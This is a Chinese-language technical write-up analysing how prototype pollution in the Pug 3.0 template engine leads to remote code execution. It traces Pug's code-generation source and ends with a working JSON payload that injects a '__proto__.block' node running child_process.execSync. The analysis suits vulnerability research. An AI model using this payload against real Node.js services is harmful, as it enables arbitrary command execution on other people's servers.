nodejs的一些模板引擎，例如pug，是存在一些安全隐患的，在pug3.0当中能够利用原型污染达到RCE


关于pug，其主要的实现原理是根据传入模板字符串，利用正则表达式生成tokens，所谓tokens就是根据语法解析函数生成描述解析结果的对象,例如：

```
[
  { type: 'tag', loc: { start: [Object], end: [Object] }, val: 'span' },
  {
    type: 'text',
    loc: { start: [Object], end: [Object] },
    val: 'Hello '
  },
  {
    type: 'interpolated-code',
    loc: { start: [Object], end: [Object] },
    mustEscape: true,
    buffer: true,
    val: 'user'
  },
  {
    type: 'text',
    loc: { start: [Object], end: [Object] },
    val: ', thank you for letting us know!'
  },
  { type: 'eos', loc: { start: [Object], end: [Object] } }
]
```

根据上面的语法单元最终会生成一颗语法树结构，也就是ast树，像下面这样：

```
{
  type: 'Block',
  nodes: [
    {
      type: 'Tag',
      name: 'span',
      selfClosing: false,
      block: [Object],
      attrs: [],
      attributeBlocks: [],
      isInline: true,
      line: 1,
      column: 1
    }
  ],
  line: 0,
  declaredBlocks: {}
}
```
block套block，安装一定的顺序展开下去，就是ast树


这些数据结构的生成类似这样，以block为例：


```javascript
 block: function() {
    var captures;
    if ((captures = /^block +([^\n]+)/.exec(this.input))) { //input就是token
      var name = captures[1].trim();
      var comment = '';
      if (name.indexOf('//') !== -1) {
        comment =
          '//' +
          name
            .split('//')
            .slice(1)
            .join('//');
        name = name.split('//')[0].trim();
      }
      if (!name) return;
      var tok = this.tok('block', name);  //this.tok用类似于push的方式添加节点
      var len = captures[0].length - comment.length;
      while (this.whitespaceRe.test(this.input.charAt(len - 1))) len--;
      this.incrementColumn(len);
      tok.mode = 'replace';
      this.tokens.push(this.tokEnd(tok));
      this.consume(captures[0].length - comment.length);
      this.incrementColumn(captures[0].length - comment.length - len);
      return true;
    }
  }
```


所以模板节点产生的过程本身没有直接产生原型污染，但是我看到option对象的成员没有任何校验，也使用了foreach这样的遍历去赋值，这也是原型污染点，但是没有办法rce（需要参与template代码生成才行，下面说）

能够产生rce的是产生的template函数的代码，
像，pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })，compile实际上就是用function的constructor生成一段代码，代码的生成依赖ast树节点，看下面的代码：



```javascript
compile: function() {
    this.buf = [];
    if (this.pp) this.buf.push('var pug_indent = [];');
    this.lastBufferedIdx = -1;
    this.visit(this.node); //<<<<<------------------------------------------------------
    if (!this.dynamicMixins) {
      // if there are no dynamic mixins we can remove any un-used mixins
      var mixinNames = Object.keys(this.mixins);
      for (var i = 0; i < mixinNames.length; i++) {
        var mixin = this.mixins[mixinNames[i]];
        if (!mixin.used) {
          for (var x = 0; x < mixin.instances.length; x++) {
            for (
              var y = mixin.instances[x].start;
              y < mixin.instances[x].end;
              y++
            ) {
              this.buf[y] = '';
            }
          }
        }
      }
    }
    var js = this.buf.join('\n');
    var globals = this.options.globals
      ? this.options.globals.concat(INTERNAL_VARIABLES)
      : INTERNAL_VARIABLES;
    if (this.options.self) {
      js = 'var self = locals || {};' + js;
    } else {
      js = addWith(
        'locals || {}',
        js,
        globals.concat(
          this.runtimeFunctionsUsed.map(function(name) {
            return 'pug_' + name;
          })
        )
      );
    }
    if (this.debug) {
      if (this.options.includeSources) {
        js =
          'var pug_debug_sources = ' +
          stringify(this.options.includeSources) +
          ';\n' +
          js;
      }
      js =
        'var pug_debug_filename, pug_debug_line;' +
        'try {' +
        js +
        '} catch (err) {' +
        (this.inlineRuntimeFunctions ? 'pug_rethrow' : 'pug.rethrow') +
        '(err, pug_debug_filename, pug_debug_line' +
        (this.options.includeSources
          ? ', pug_debug_sources[pug_debug_filename]'
          : '') +
        ');' +
        '}';
    }
    return (
      buildRuntime(this.runtimeFunctionsUsed) +
      'function ' +
      (this.options.templateName || 'template') +
      '(locals) {var pug_html = "", pug_mixins = {}, pug_interp;' +
      js +
      ';return pug_html;}'
    );
  }
```


上面的js变量一直在拼接我们的ast树的某一些值，当然你如果能控制原生的模板字符串就可以rce，但是我们讨论的不是ssti，利用prototype pollute在不能控制模板字符串的情况下也可以rce


有两个问题：

1 污染的prototype会被注入生成template函数中的什么地方



答案是上面的visit函数
```javascript
visit: function(node, parent) {
    var debug = this.debug;

    if (!node) {
      var msg;
      if (parent) {
        msg =
          'A child of ' +
          parent.type +
          ' (' +
          (parent.filename || 'Pug') +
          ':' +
          parent.line +
          ')';
      } else {
        msg = 'A top-level node';
      }
      msg += ' is ' + node + ', expected a Pug AST Node.';
      throw new TypeError(msg);
    }

    if (debug && node.debug !== false && node.type !== 'Block') {  //看这里，debug默认是true，而如果污染了node.type属性为非block，node.line为恶意代码则可以完成rce
      if (node.line) {
        var js = ';pug_debug_line = ' + node.line;  //恶意代码被拼接
        if (node.filename)
          js += ';pug_debug_filename = ' + stringify(node.filename);
        this.buf.push(js + ';');
      }
    }

    if (!this['visit' + node.type]) {
      var msg;
      if (parent) {
        msg = 'A child of ' + parent.type;
      } else {
        msg = 'A top-level node';
      }
      msg +=
        ' (' +
        (node.filename || 'Pug') +
        ':' +
        node.line +
        ')' +
        ' is of type ' +
        node.type +
        ',' +
        ' which is not supported by pug-code-gen.';
      switch (node.type) {
        case 'Filter':
          msg += ' Please use pug-filters to preprocess this AST.';
          break;
        case 'Extends':
        case 'Include':
        case 'NamedBlock':
        case 'FileReference': // unlikely but for the sake of completeness
          msg += ' Please use pug-linker to preprocess this AST.';
          break;
      }
      throw new TypeError(msg);
    }

    this.visitNode(node);
  }


```


2 上面的node是什么，怎么污染它？
  
  
  node其实就是ast中的那个node,visit函数只会进入一次，它会依次按顺序遍历所有node，添加一些js字符串。要想让我们代码的字符串被拼进去就要通过污染嵌入恶意的node，但是为什么不能直接污染node.type和node.line？因为通常它的parentnode会有这两个属性，当前正常节点完成后不会对一个空node对象再去调用visit，所以要实现构造一个node。构造的方法其实是这个函数：


  ```javascript
module.exports = walkAST;
function walkAST(ast, before, after, options) {
....
....

  switch (ast.type) {
    case 'NamedBlock':
    case 'Block':
      ast.nodes = walkAndMergeNodes(ast.nodes);
      break;
    case 'Case':
    case 'Filter':
    case 'Mixin':
    case 'Tag':
    case 'InterpolatedTag':
    case 'When':
    case 'Code':
    case 'While':
      if (ast.block) {

        ast.block = walkAST(ast.block, before, after, options);   //污染了block的话，只要检测到type为code的节点就会构造一个我们污染的node，当然，后面的each等等也是可以的
      }
      break;
    case 'Each':
      if (ast.block) {
        ast.block = walkAST(ast.block, before, after, options);
      }
      if (ast.alternate) {
        ast.alternate = walkAST(ast.alternate, before, after, options);
      }
      break;
    case 'EachOf':
      if (ast.block) {
        ast.block = walkAST(ast.block, before, after, options);
      }
      break;
    case 'Conditional':
      if (ast.consequent) {
        ast.consequent = walkAST(ast.consequent, before, after, options);
      }
      if (ast.alternate) {
        ast.alternate = walkAST(ast.alternate, before, after, options);
      }
      break;
    case 'Include':
      walkAST(ast.block, before, after, options);
      walkAST(ast.file, before, after, options);
      break;
    case 'Extends':
      walkAST(ast.file, before, after, options);
      break;
    case 'RawInclude':
      ast.filters = walkAndMergeNodes(ast.filters);
      walkAST(ast.file, before, after, options);
      break;
    case 'Attrs':
    case 'BlockComment':
    case 'Comment':
    case 'Doctype':
    case 'IncludeFilter':
    case 'MixinBlock':
    case 'YieldBlock':
    case 'Text':
      break;
    case 'FileReference':
      if (options.includeDependencies && ast.ast) {
        walkAST(ast.ast, before, after, options);
      }
      break;
    default:
      throw new Error('Unexpected node type ' + ast.type);
      break;
  }
....

  ```


  讲了这么多，这就是payload：
{
			"__proto__.block": {
	        "type": "Text", 
	        "line": "process.mainModule.require('child_process').execSync('$(whoami)')"
		    }
}
